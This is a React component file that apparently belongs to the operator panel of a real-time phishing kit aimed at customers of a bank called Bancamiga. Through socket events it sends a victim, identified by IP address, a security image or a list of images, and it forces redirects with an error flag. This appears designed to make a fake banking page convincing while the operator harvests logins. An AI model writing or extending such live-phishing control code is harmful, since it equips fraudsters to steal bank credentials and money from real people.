
import { useFormik } from "formik"
import {Popover, Button, PopoverTrigger, PopoverContent, Checkbox} from '@nextui-org/react';
import { useState } from "react";

export const ErrorIconLive = ({socket, ip, urlPage, onClose, textPage}) => {
  
  const [formView, setFormView] = useState(false)
  const [isSelected, setIsSelected] = useState(false)

  const {values, handleBlur, handleChange, handleSubmit } = useFormik({
    initialValues: {
      image: ''
    },
    onSubmit: ({image}) =>{
      if(textPage == 'Metodo seguridad') socket.emit('[bancamiga] getImage', {image, ip})
      if(textPage == 'Imagen') socket.emit('[bancamiga] getListImage', {listImage: JSON.parse(image) , ip})
      socket.emit('[live] panelSendRedirect', { ip, urlPage, errorBag: true })
      setFormView(false)
      onClose()
    }
  })
  const sendBagRedirect = () => {
  if(textPage == 'Metodo seguridad' || textPage == 'Imagen' ) return setFormView(true)
    socket.emit('[live] panelSendRedirect', { ip, urlPage, errorBag: true })
    onClose()
  }
  
  return (
    <div>
      <Popover  isOpen={formView} onOpenChange={(open) => sendBagRedirect()} placement="right">
        <PopoverTrigger onClick={() => sendBagRedirect()} >
          <div className="cursor-pointer">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-6 h-6">
                <path strokeLinecap="round" strokeLinejoin="round" d="M6 12 3.269 3.125A59.769 59.769 0 0 1 21.485 12 59.768 59.768 0 0 1 3.27 20.875L5.999 12Zm0 0h7.5" />
            </svg>
          </div>
        </PopoverTrigger>
        <PopoverContent >
          <form onSubmit={handleSubmit} className={'p-2 flex gap-2 flex-col'}>
            <p>Introduce el link de la imagen</p>
            <input disabled={isSelected} required autoComplete="false" className="w-full py-1 " type="text" name="image" value={values.image} onChange={handleChange} />
            {
              textPage == 'Metodo seguridad' ? (
                  <Checkbox isSelected={isSelected} onValueChange={setIsSelected}>
                    Omitir foto
                  </Checkbox>
              ) : null
            }
            <Button className="w-full mt-5" type="submit" color="primary" variant="shadow" size="sm" >ENVIAR</Button>
          </form>
        </PopoverContent>
      </Popover>
      
      
    </div>
  )
}
